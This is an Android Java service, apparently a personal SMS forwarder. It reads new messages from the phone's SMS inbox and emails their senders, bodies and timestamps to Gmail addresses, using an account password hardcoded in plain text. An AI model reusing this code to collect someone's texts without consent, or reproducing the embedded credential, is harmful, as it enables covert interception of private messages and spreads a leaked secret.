package com.i112358.forwarder;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

public class ForwarderService extends Service {
    final private String TAG = "Forwarder";
    final private String LAST_MESSAGE = "lastMessage";

    public ForwarderService() {
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        Log.i(TAG, "Forwarder Service is started");
    }
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand");

        searchNewContent();
        return super.onStartCommand(intent, flags, startId);
    }

    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy");
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    // Main logic
    void searchNewContent()
    {
        final int _hasPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if ( _hasPermission != PackageManager.PERMISSION_GRANTED ) {
            Log.e(TAG, "No permission granted");
            return;
        }

        final String _newMessages = findNewMessages();
        if ( !_newMessages.isEmpty() ) {
            Log.i(TAG, _newMessages);
            new Thread(new Runnable() {
                public void run() {
                    try {
                        com.i112358.forwarder.MailSender sender = new com.i112358.forwarder.MailSender(
                                "iv7enov@gmail.com",
                                "4ZyRBDQg%QQ");
                        sender.sendMail("Test mail", _newMessages, "iv7enov@gmail.com", "dolgih.iv@gmail.com");
                        Log.i(TAG, "Messages sent successfully");
                    } catch (Exception e) {
                        Toast.makeText(getApplicationContext(), "Error", Toast.LENGTH_LONG).show();
                    } finally {
                        Log.d(TAG, "Stop forwarder Service");
                        stopSelf();
                    }
                }
            }).start();
        } else {
            Log.w(TAG, "No new messages");
        }
    }

    String findNewMessages()
    {
        SharedPreferences _preferences = getSharedPreferences(getPackageName(), Context.MODE_PRIVATE);
        long previousSmsTime = _preferences.getLong(LAST_MESSAGE, 0);
        long _newSmsTimeForSave = previousSmsTime;
        Log.i(TAG, "Last message saved time " + previousSmsTime);

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        StringBuilder _messageBuilder = new StringBuilder();
        int _counter = 0;
        int _totalMessages = 0;

        if ( cursor != null && cursor.getCount() > 0 ) {
            if ( cursor.moveToFirst() ) { // must check the result to prevent exception
                do {
                    _totalMessages++;
                    long _newMessageTime = Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    if ( _newMessageTime > previousSmsTime ) {
                        _newSmsTimeForSave = Math.max(_newMessageTime, _newSmsTimeForSave);
                        com.i112358.forwarder.Sms _sms = new com.i112358.forwarder.Sms();
                        _sms.setId(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                        _sms.setAddress(cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        _sms.setMsg(cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        _sms.setReadState(cursor.getString(cursor.getColumnIndex("read")));
                        _sms.setTime(cursor.getString(cursor.getColumnIndexOrThrow("date")));

                        _messageBuilder.append(_sms.makeString());
                        _counter++;
                    }
                /*
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    Log.i(TAG, cursor.getColumnName(idx) + " : " + cursor.getString(idx));
                }
                */
                } while ( cursor.moveToNext() );
            } else {
                Log.i(TAG, "Sms list empty");
            }
            cursor.close();
        }

        SharedPreferences.Editor _editor = _preferences.edit();
        _editor.putLong(LAST_MESSAGE, _newSmsTimeForSave);
        _editor.apply();

        Log.i(TAG, "Found new messages: " + _counter + "/" + _totalMessages);
        Log.i(TAG, "Update last message time " + _newSmsTimeForSave);

        return _messageBuilder.toString();
    }
}
